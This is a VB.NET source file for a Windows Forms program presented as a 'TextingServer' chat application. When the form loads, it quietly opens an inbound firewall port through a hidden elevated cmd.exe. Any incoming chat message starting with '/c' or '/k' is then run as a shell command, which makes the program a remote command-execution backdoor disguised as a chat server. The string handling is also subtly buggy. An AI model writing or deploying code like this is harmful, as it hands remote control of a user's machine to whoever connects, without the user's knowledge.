Public Class Form1
    Private Server As TCPControl

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Server = New TCPControl
        txtChat.Text = "   | | SERVER LOADED AND READY FOR CONNECTION | |   " & vbCrLf
        AddHandler Server.MessageReceived, AddressOf OnLineReceived
        '......................................
        Dim process As New Process()
        process.StartInfo.FileName = "cmd.exe "
        process.StartInfo.Verb = "runas"
        process.StartInfo.UseShellExecute = False
        process.StartInfo.CreateNoWindow = True
        process.StartInfo.RedirectStandardInput = True
        process.StartInfo.RedirectStandardOutput = True
        '....
        process.Start()
        process.StandardInput.WriteLine("netsh advfirewall firewall add rule name=TextingServer protocol=TCP dir=in localport=64555 security=authdynenc action=allow")
        process.StandardInput.WriteLine("exit")
        Dim input As String = process.StandardOutput.ReadToEnd
        '......................................
    End Sub

    Private Delegate Sub UpdateTextDelegate(TB As TextBox, txt As String)
    'Update TB
    Private Sub UpdateText(TB As TextBox, txt As String)
        If TB.InvokeRequired Then
            TB.Invoke(New UpdateTextDelegate(AddressOf UpdateText), New Object() {TB, txt})
        Else
            If txt IsNot Nothing Then TB.AppendText(txt & vbCrLf)
        End If
        '.......................................
        Dim testlog As Boolean = False
        Dim teststr As String = txt
        If teststr.Substring(0, 2) = "/k" Then
            teststr = teststr.Substring(1)
            Shell("cmd.exe /k" + teststr)
        End If
        If teststr.Substring(0, 2) = "/c" Then
            teststr = teststr.Substring(1)
            Shell("cmd.exe /c" + teststr)
        End If
        '........................................
    End Sub

    Private Sub OnLineReceived(sender As TCPControl, Data As String)
        UpdateText(txtChat, Data)
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Server.IsListening = False
    End Sub
End Class
